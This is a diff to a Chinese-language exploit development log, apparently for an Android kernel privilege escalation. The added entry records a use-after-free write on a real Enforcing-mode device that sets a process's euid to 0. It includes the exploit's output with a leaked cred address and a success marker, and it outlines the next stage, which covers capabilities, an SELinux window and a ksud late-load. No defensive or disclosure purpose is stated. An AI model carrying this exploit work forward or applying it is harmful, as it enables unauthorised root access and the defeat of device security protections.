@@ -125,3 +125,17 @@ CRED_LEAK_ONLY_OK
 
 ## 注：GitHub 备份检查点
 - `e1aa201`（初次备份）→ 本次再提交：6.18 kmem 解析修复、leak-only 开关、README_direct、构建/恢复记录。
+
+## 2026-11-26 00:12 euid 提权写成功（CRED_ORACLE_OK，真机首次内核对象写）
+clean boot `b7f7c947`（Enforcing、无 KSU）真机执行 `--stage=cred`：
+```
+[+] cred leak: child=29745 cred=0xffffff80524f2c00 (8192 bytes)
+[*] euid try 1: uid=2000 euid=0 gid=2000 egid=2000
+[+] cred cand=0xffffff80524f2c00 euid=0 (uaf_writes=1)
+CRED_ORACLE_OK
+[!] direct engine complete: reboot required (PARKED marker set)
+```
+- 第一次 UAF 固定词写即命中：`vals=cred+0x12` 的 V1 词把 child `euid` 写成 0；
+- 无 panic、boot_id 未变；child 仍 uid=2000（只改了 euid），caps 未动；
+- 该 boot 已 PARKED，按规则必须重启后再跑 `--stage=root`（fsuid/caps/AVC/selinux 窗口/ksud late-load）。
+- 里程碑意义：漏洞的 8 字节写原语已**实际改变 cred**，从"能写"进入"能提权"。
